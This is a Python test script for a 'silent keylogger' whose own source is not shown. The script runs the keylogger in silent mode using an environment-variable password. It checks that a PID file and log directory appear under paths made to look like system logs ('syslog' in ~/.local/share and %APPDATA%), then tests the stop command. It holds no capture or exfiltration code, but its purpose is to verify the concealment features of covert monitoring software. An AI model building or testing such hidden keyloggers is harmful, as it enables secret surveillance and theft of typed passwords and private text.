#!/usr/bin/env python3
"""
Test script for silent keylogger functionality
"""

import os
import sys
import time
import subprocess
import signal

def test_silent_mode():
    """Test silent mode functionality"""
    print("Testing silent mode...")
    
    # Set test password in environment
    os.environ['KEYLOGGER_PASSWORD'] = 'test123'
    
    # Start keylogger in silent mode (should not show output)
    print("Starting keylogger in silent mode...")
    process = subprocess.Popen([
        sys.executable, 'keylogger.py', '--silent'
    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # Let it run for a few seconds
    time.sleep(3)
    
    # Check if PID file was created
    pid_file = os.path.join(os.path.expanduser('~'), '.local', 'share', 'syslog', 'keylogger.pid')
    
    if os.path.exists(pid_file):
        print("✓ PID file created successfully")
        with open(pid_file, 'r') as f:
            pid = f.read().strip()
        print(f"✓ Keylogger running with PID: {pid}")
        
        # Test stop functionality
        print("Testing stop functionality...")
        stop_process = subprocess.run([
            sys.executable, 'keylogger.py', '--stop'
        ], capture_output=True, text=True)
        
        time.sleep(1)
        
        if not os.path.exists(pid_file):
            print("✓ Keylogger stopped successfully")
        else:
            print("✗ PID file still exists after stop")
            
    else:
        print("✗ PID file not created")
        # Terminate the process manually
        process.terminate()
        process.wait()
    
    # Clean up environment
    if 'KEYLOGGER_PASSWORD' in os.environ:
        del os.environ['KEYLOGGER_PASSWORD']

def test_file_locations():
    """Test file location creation"""
    print("\nTesting file locations...")
    
    if os.name == 'nt':  # Windows
        log_dir = os.path.join(os.environ['APPDATA'], '.syslog')
    else:  # macOS/Linux
        log_dir = os.path.join(os.path.expanduser('~'), '.local', 'share', 'syslog')
    
    print(f"Expected log directory: {log_dir}")
    
    # Import keylogger to trigger directory creation
    sys.path.insert(0, '.')
    import keylogger
    
    if os.path.exists(log_dir):
        print("✓ Log directory created successfully")
    else:
        print("✗ Log directory not created")

def main():
    """Run all tests"""
    print("=== Silent Keylogger Test Suite ===\n")
    
    # Change to keylogger directory
    script_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(script_dir)
    
    try:
        test_file_locations()
        test_silent_mode()
        print("\n=== Test Summary ===")
        print("All tests completed. Check output above for results.")
        
    except Exception as e:
        print(f"Test failed with error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
